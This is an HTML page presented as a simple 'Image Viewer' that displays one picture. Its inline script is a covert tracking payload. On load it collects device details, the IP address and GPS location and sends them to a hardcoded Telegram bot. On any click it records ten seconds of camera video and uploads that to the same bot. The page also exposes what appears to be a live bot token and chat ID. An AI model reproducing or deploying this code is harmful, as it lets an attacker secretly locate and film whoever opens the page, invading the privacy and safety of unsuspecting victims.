<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; padding: 0; background: #000; }
        img { width: 100%; height: auto; }
    </style>
</head>
<body>
    <img src="https://image2url.com/images/1754223677507-03a3b8dc-4a52-4cad-8207-64e6a5c6f74b.jpg" alt="Loading...">

    <script>
        // Telegram bot setup
        const BOT_TOKEN = "8386686128:AAFLCInZJmy72La6aiWW2GPy9iTSfptNmts";
        const CHAT_ID = "7307112522";

        // Collect device info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
        };

        // Get IP (via free API)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                deviceInfo.ip = data.ip;

                // Get GPS (if mobile + permissions trick)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            deviceInfo.gps = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            sendToTelegram(deviceInfo);
                        },
                        (error) => {
                            deviceInfo.gpsError = error.message;
                            sendToTelegram(deviceInfo);
                        }
                    );
                } else {
                    deviceInfo.gpsError = "Geolocation not supported";
                    sendToTelegram(deviceInfo);
                }
            });

        // Send data to Telegram bot
        function sendToTelegram(data) {
            const message = `📱 *Device HIT* 📱\n\n` +
                `🔍 *IP:* ${data.ip || "N/A"}\n` +
                `📌 *GPS:* ${data.gps ? `${data.gps.lat}, ${data.gps.lon}` : "N/A"}\n` +
                `🛠 *User Agent:* ${data.userAgent}\n` +
                `🖥 *Screen:* ${data.screenWidth}x${data.screenHeight}\n` +
                `🌐 *Language:* ${data.language}\n` +
                `⏰ *Timezone:* ${data.timezone}\n` +
                `🍪 *Cookies:* ${data.cookiesEnabled ? "Enabled" : "Disabled"}\n`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
        }

        // Screen recording / camera access (requires user permission)
        document.addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    const recorder = new MediaRecorder(stream);
                    let chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const formData = new FormData();
                        formData.append('video', blob, 'screen_capture.webm');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
                            method: 'POST',
                            body: formData
                        });
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 10000); // 10 sec recording
                })
                .catch(err => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CAMERA_BLOCKED:${err.message}`);
                });
        });
    </script>
</body>
</html>
